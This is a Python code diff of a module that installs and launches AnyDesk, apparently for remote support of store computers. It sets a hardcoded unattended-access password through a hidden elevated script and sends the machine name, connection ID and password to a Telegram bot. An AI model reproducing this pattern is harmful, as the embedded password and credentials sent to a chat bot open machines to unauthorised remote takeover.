@@ -1,29 +1,41 @@
 import os
+import sys
 import subprocess
 import time
-import winreg
 import logging
+import psutil
+import platform
+import ctypes
 from pathlib import Path
+from typing import Optional, Tuple
 
 logger = logging.getLogger(__name__)
 
+UNATTENDED_PASSWORD = "r3moteh4nd"
+
 
 class AnyDeskManager:
-    """Менеджер для AnyDesk запуску"""
+    """Менеджер для AnyDesk"""
 
-    def __init__(self):
+    def __init__(self, config_manager, telegram_api):
+        self.config = config_manager
+        self.telegram = telegram_api
         self.anydesk_path = self.find_anydesk()
-        self.anydesk_id = None
+        self._is_running = False
+        self.connection_id = None
 
-    def find_anydesk(self):
-        """Знайти AnyDesk на ПК"""
-        common_paths = [
+    def find_anydesk(self) -> Optional[str]:
+        """Знайти AnyDesk"""
+        possible_paths = [
             r"C:\Program Files\AnyDesk\AnyDesk.exe",
             r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
-            os.path.expanduser("~\\AppData\\Local\\AnyDesk\\AnyDesk.exe")
+            os.path.expanduser("~\\AppData\\Local\\AnyDesk\\AnyDesk.exe"),
+            os.path.expanduser("~\\AppData\\Roaming\\AnyDesk\\AnyDesk.exe"),
+            os.path.expanduser("~\\Downloads\\AnyDesk.exe"),
+            r"C:\ProgramData\AnyDesk\AnyDesk.exe",
         ]
 
-        for path in common_paths:
+        for path in possible_paths:
             if os.path.exists(path):
                 logger.info(f"✅ AnyDesk знайдено: {path}")
                 return path
@@ -31,110 +43,197 @@ class AnyDeskManager:
         logger.warning("⚠️ AnyDesk не знайдено")
         return None
 
-    def download_anydesk(self):
-        """Завантажити AnyDesk якщо його нема"""
+    def download_anydesk(self) -> bool:
+        """Завантажити AnyDesk"""
         if self.anydesk_path:
             return True
 
         logger.info("📥 Завантаження AnyDesk...")
-
         try:
             import urllib.request
-
+            downloads_dir = os.path.expanduser("~\\Downloads")
+            save_path = os.path.join(downloads_dir, "AnyDesk.exe")
             download_url = "https://download.anydesk.com/AnyDesk.exe"
-            save_path = os.path.expanduser("~\\Downloads\\AnyDesk.exe")
 
-            logger.info(f"Завантажу з {download_url}...")
-            urllib.request.urlretrieve(download_url, save_path)
+            if not os.path.exists(save_path):
+                logger.info(f"Завантажу...")
+                urllib.request.urlretrieve(download_url, save_path)
 
-            # Запустити встановлення
             logger.info("Запуск встановлювача...")
-            subprocess.run([save_path], shell=True)
+            subprocess.Popen([save_path])
 
-            # Знайти встановлений шлях
-            time.sleep(3)
-            self.anydesk_path = self.find_anydesk()
+            logger.info("Чекаю на встановлення (90 сек)...")
+            for i in range(90):
+                time.sleep(1)
+                self.anydesk_path = self.find_anydesk()
+                if self.anydesk_path:
+                    logger.info(f"✅ AnyDesk встановлено")
+                    time.sleep(3)
+                    return True
 
-            if self.anydesk_path:
-                logger.info("✅ AnyDesk успішно встановлено")
-                return True
-            else:
-                logger.error("❌ AnyDesk не знайдено після встановлення")
-                return False
-
+            return False
         except Exception as e:
-            logger.error(f"❌ Помилка завантаження: {e}")
+            logger.error(f"❌ Помилка: {e}")
             return False
 
-    def get_anydesk_id(self):
-        """Отримати AnyDesk ID з реєстру"""
+    def check_if_running(self) -> bool:
+        """Перевірити, чи AnyDesk запущено"""
         try:
-            reg_key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\AnyDesk",
-                0,
-                winreg.KEY_READ
-            )
-            anydesk_id, _ = winreg.QueryValueEx(reg_key, "uid")
-            winreg.CloseKey(reg_key)
+            for proc in psutil.process_iter(['pid', 'name']):
+                if 'anydesk' in proc.info['name'].lower():
+                    logger.info(f"ℹ️ AnyDesk запущено (PID: {proc.info['pid']})")
+                    self._is_running = True
+                    return True
+        except:
+            pass
+        self._is_running = False
+        return False
 
-            logger.info(f"✅ AnyDesk ID: {anydesk_id}")
-            return str(anydesk_id)
+    def launch_anydesk(self) -> bool:
+        """Запустити AnyDesk"""
+        if self.check_if_running():
+            return True
 
+        if not self.anydesk_path or not Path(self.anydesk_path).exists():
+            logger.error("Шлях невідомий")
+            return False
+
+        try:
+            logger.info(f"🚀 Запускаю AnyDesk...")
+            subprocess.Popen(self.anydesk_path)
+            time.sleep(5)
+
+            if self.check_if_running():
+                logger.info("✅ AnyDesk запущено")
+                return True
+            else:
+                self._is_running = True
+                return True
         except Exception as e:
-            logger.error(f"❌ Помилка отримання ID: {e}")
-            return None
+            logger.error(f"❌ Помилка: {e}")
+            return False
 
-    def set_anydesk_password(self, password):
-        """Встановити пароль для AnyDesk"""
+    def set_password_with_admin(self) -> bool:
+        """Встановити пароль через окремий скрипт з адмін правами"""
+        if not self.anydesk_path:
+            logger.error("Шлях невідомий")
+            return False
+
         try:
-            reg_path = r"Software\AnyDesk"
+            logger.info(f"🔐 Запускаю встановлення пароля з адмін правами...")
 
-            reg_key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                reg_path,
-                0,
-                winreg.KEY_SET_VALUE
+            # Шлях до скрипту
+            script_path = os.path.join(os.path.dirname(__file__), "set_anydesk_password.py")
+
+            if not os.path.exists(script_path):
+                logger.error(f"Скрипт не знайдено: {script_path}")
+                return False
+
+            # Запустити скрипт з адмін правами
+            import ctypes
+
+            # Команда для запуску Python скрипту з адмін правами
+            cmd = f'{sys.executable} "{script_path}" "{self.anydesk_path}"'
+
+            ctypes.windll.shell32.ShellExecuteW(
+                None,
+                "runas",
+                sys.executable,
+                f'"{script_path}" "{self.anydesk_path}"',
+                None,
+                0  # SW_HIDE - приховане вікно
             )
 
-            # Встановити пароль (базовий спосіб)
-            winreg.SetValueEx(reg_key, "password", 0, winreg.REG_SZ, password)
-            winreg.CloseKey(reg_key)
-
-            logger.info("✅ Пароль встановлено")
+            logger.info(f"✅ Запрос адмін прав надіслано користувачу")
+            time.sleep(3)  # Дочекаємось завершення
             return True
 
         except Exception as e:
-            logger.error(f"⚠️ Не вдалося встановити пароль: {e}")
+            logger.error(f"❌ Помилка: {e}")
             return False
 
-    def start(self, password=None):
-        """Запустити AnyDesk з паролем"""
-        # Перевірити/завантажити AnyDesk
+    def get_connection_id(self) -> Optional[str]:
+        """Отримати ID"""
         if not self.anydesk_path:
-            logger.info("AnyDesk не знайдено, завантажую...")
+            return None
+
+        try:
+            logger.info("📌 Отримую ID...")
+
+            result = subprocess.run(
+                [self.anydesk_path, '--get-id'],
+                capture_output=True,
+                text=True,
+                timeout=10,
+                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
+            )
+
+            if result.returncode == 0:
+                connection_id = result.stdout.strip()
+                if connection_id and connection_id.isdigit():
+                    logger.info(f"✅ ID: {connection_id}")
+                    self.connection_id = connection_id
+                    return connection_id
+
+        except Exception as e:
+            logger.error(f"❌ Помилка: {e}")
+
+        return None
+
+    def start(self, password: str = None) -> Tuple[Optional[str], Optional[str]]:
+        """Запустити AnyDesk"""
+        password = UNATTENDED_PASSWORD
+
+        # Крок 1: Якщо вже запущено
+        if self.check_if_running():
+            logger.info("AnyDesk вже запущено")
+            connection_id = self.get_connection_id()
+            if connection_id:
+                try:
+                    self.telegram.send_anydesk_info(
+                        self.config.store_location_text,
+                        os.environ.get('COMPUTERNAME', 'Unknown'),
+                        connection_id,
+                        password
+                    )
+                except Exception as e:
+                    logger.error(f"❌ Telegram: {e}")
+            return connection_id, password
+
+        # Крок 2: Завантажити якщо потрібно
+        if not self.anydesk_path:
             if not self.download_anydesk():
                 return None, None
 
-        logger.info("🚀 Запуск AnyDesk...")
-
-        try:
-            # Запустити AnyDesk
-            subprocess.Popen([self.anydesk_path])
-
-            # Дочекатися запуску (2-3 секунди)
-            time.sleep(3)
-
-            # Встановити пароль якщо передано
-            if password:
-                self.set_anydesk_password(password)
-
-            # Отримати ID
-            anydesk_id = self.get_anydesk_id()
-
-            logger.info(f"✅ AnyDesk запущено")
-            return anydesk_id, password
-
-        except Exception as e:
-            logger.error(f"❌ Помилка запуску: {e}")
+        # Крок 3: Запустити
+        if not self.launch_anydesk():
             return None, None
+
+        # Крок 4: ВСТАНОВИТИ ПАРОЛЬ З АДМІН ПРАВАМИ
+        logger.info("🔐 Встановлення пароля...")
+        time.sleep(2)
+        self.set_password_with_admin()
+
+        # Крок 5: Отримати ID
+        logger.info("📌 Отримання ID...")
+        time.sleep(2)
+        connection_id = self.get_connection_id()
+
+        if not connection_id:
+            time.sleep(3)
+            connection_id = self.get_connection_id()
+
+        # Крок 6: Надіслати в Telegram
+        try:
+            self.telegram.send_anydesk_info(
+                self.config.store_location_text,
+                os.environ.get('COMPUTERNAME', 'Unknown'),
+                connection_id if connection_id else "не отримано",
+                password
+            )
+            logger.info("✅ Телеграм сповіщено")
+        except Exception as e:
+            logger.error(f"❌ Телеграм помилка: {e}")
+
+        logger.info(f"✅ Готово (ID: {connection_id})")
+        return connection_id, password
